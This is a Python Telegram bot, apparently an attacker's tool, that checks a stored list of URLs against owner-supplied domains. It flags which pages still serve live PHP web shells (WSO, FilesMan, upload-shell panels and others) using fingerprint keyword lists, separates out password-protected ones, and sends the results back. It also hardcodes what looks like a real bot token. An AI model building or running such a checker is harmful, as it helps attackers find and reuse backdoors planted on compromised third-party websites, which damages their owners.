import os
import importlib.util
import subprocess
import sys

# Now that we know the modules are installed, proceed with imports
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
import requests

# Disable SSL warnings
requests.urllib3.disable_warnings()

# Define OWNER_ID (replace with your actual Telegram user ID)
OWNER_ID = 1733066276  # Replace with your Telegram user ID

# Function to check if the user is the owner
def is_owner(update: Update) -> bool:
    return update.effective_user.id == OWNER_ID

# Keyword lists remain the same
REAL_KEYWORDS = [
    "-rw-r--r", 
    "-rw-r--r--", 
    "drwxr-xr-x", 
    "-rw-rw-rw-"
]
GOOD_KEYWORDS = [
    ">File Manager</h1>", "-rw-r--r--", "drwxr-xr-x", "-rw-rw-rw-", "X0MB13</title>",
    "Tiny File Manager", 'type="submit" class="upload-submit" name="upload-submit" value="Upload"',
    'Upload file</a></td>', "PHP File Manager", 'type="submit" name="test" value="Upload"',
    "<input type=submit value='>>'>", 'FilesMan', 'Log In | ECWS', '<title>File manager</title>',
    "<title>L I E R SHELL</title>", 'action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"',
    'kill_the_net', "<title>fuck</title>", ' <title>freshtools wso 1.0</title>', 'Shell Bypass 403 GE-C666C',
    'Doc Root:', 'BlackDragon', '//0x5a455553.github.io/MARIJUANA/icon.png', '{Ninja-Shell}',
    '%PDF-0-1<form action="" method="post"><input type="text" name="_rg"><input type="submit" value=">>"></form>',
    'method= "post" action= ""> <input type="input" name ="f_p" value= ""/><input type= "submit" value= ">"'
]
PASS_KEYWORDS = [
    '<form method=post>Password<br>', '<input type="password" name="fm_pwd" value="" placeholder="Password" required>',
    '<form method=post>Password: <input type=password name=pass><input', '<input type="submit" name="submit" value="  >>">',
    "<input name='postpass' type='password'", '<div><input type="password" name="key" style="width: 50%;" value></div>',
    '<form method="post" enctype="multipart/form-data"><div', '<input type="password" name="password">', 'ZeroByte.ID',
    '<span>Path: </span><a href', "<title>.</title>", "WSO 4.2.6</title>", '<input type=password name="pass" >','<input type="submit" value="Go" name="con"'
]
UPLOAD_KEYWORDS = [
    'form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"',
    "<input type='submit' value='UPload File' />", "<span>Upload file:</span>", "Upload File : <input",
    "input type='submit' value='upload shell'", '<a title="Upload" class="nav-link"', '<input type="file" name="upfile" id="ltb">',
    '<input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />', 'href="?p=&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> Upload</a>',
    'input type="file" name="file"', 'type="file" name="uploaded_file"', 'type="file"/><input type="submit"',
    'type="submit" id="_upl" value="Upload">', 'type="submit" value="Upload"', 'name="up_file" type="file"/><input type="submit"'
]

# Function to check URL for keywords remains the same
def check_url_for_keywords(url):
    try:
        response = requests.get(
            url,
            headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'},
            verify=False,
            timeout=10
        )
        content = response.text
        keywords = REAL_KEYWORDS + GOOD_KEYWORDS + UPLOAD_KEYWORDS
        if any(keyword in content for keyword in keywords):
            return "matched"
        elif any(keyword in content for keyword in PASS_KEYWORDS):
            return "password_protected"
        else:
            return "not_matched"
    except requests.RequestException as e:
        print(f"Error checking {url}: {e}")
        return "error"

# Load URLs from urls.txt remains the same
def load_urls_from_file(file_path):
    if not os.path.exists(file_path):
        return []
    with open(file_path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f.readlines()]

# Save data to a file remains the same
def save_to_file(file_path, data):
    with open(file_path, "w") as f:
        for line in data:
            f.write(line + "\n")

# Process domains (either from file or direct input) remains the same
async def process_domains(update: Update, context: ContextTypes.DEFAULT_TYPE, domains: list):
    # Load URLs
    urls = load_urls_from_file("urls.txt")
    # Find matching URLs
    matching_urls = []
    passw_urls = []
    not_work_urls = []
    for url in urls:
        for domain in domains:
            if domain in url:
                result = check_url_for_keywords(url)
                if result == "matched":
                    matching_urls.append(url)
                elif result == "password_protected":
                    passw_urls.append(url)
                elif result == "not_matched":
                    not_work_urls.append(url)
    # Save results to files
    save_to_file("matching_urls.txt", matching_urls)
    save_to_file("passw.txt", passw_urls)
    save_to_file("Not_work.txt", not_work_urls)
    # Helper function to send a file if it's not empty
    async def send_file_if_not_empty(file_path, filename):
        if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
            with open(file_path, "rb") as f:
                await update.message.reply_document(document=f, filename=filename)
        else:
            await update.message.reply_text(f"No data to send for {filename}.")
    # Send results back to the user
    await send_file_if_not_empty("matching_urls.txt", "matching_urls.txt")
    await send_file_if_not_empty("passw.txt", "passw.txt")
    await send_file_if_not_empty("Not_work.txt", "Not_work.txt")
    # Clean up matching_urls.txt file
    try:
        os.remove("matching_urls.txt")
    except FileNotFoundError:
        print("matching_urls.txt not found for deletion.")
    except Exception as e:
        print(f"Error while deleting matching_urls.txt: {e}")

# Handle file upload
async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        await update.message.reply_text("Access denied. You are not authorized to use this bot.")
        return
    file = await update.message.document.get_file()
    file_name = file.file_path.split("/")[-1]
    # Save the file locally
    file_path = await file.download_to_drive(custom_path=file_name)
    # Ensure the file contains valid domain entries
    with open(file_path, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f.readlines() if line.strip()]
        if not all(line for line in lines):
            await update.message.reply_text(f"The file '{file_name}' does not contain valid domain entries.")
            os.remove(file_path)
            return
    # Process the uploaded file
    await process_domains(update, context, lines)

# Handle direct domain input (supporting multiple domains in one message)
async def handle_direct_domain_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        await update.message.reply_text("Access denied. You are not authorized to use this bot.")
        return
    # Split the message into lines (domains)
    domains = [line.strip() for line in update.message.text.splitlines() if line.strip()]
    
    if not domains:
        await update.message.reply_text("Please provide at least one valid domain.")
        return
    # Process the list of domains
    await process_domains(update, context, domains)

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        await update.message.reply_text("Access denied. You are not authorized to use this bot.")
        return
    await update.message.reply_text(
        "Hello! You can either:\n"
        "1. Upload a file containing domain names.\n"
        "2. Send multiple domains directly in the chat (one per line)."
    )

# Main function
def main():
    TOKEN = "7093130663:AAH_9decs5eVxOYyObyPM59BLLNXipVrEMA"  # Replace with your bot token
    application = Application.builder().token(TOKEN).build()

    # Add handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file_upload))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_direct_domain_input))

    # Start the bot
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
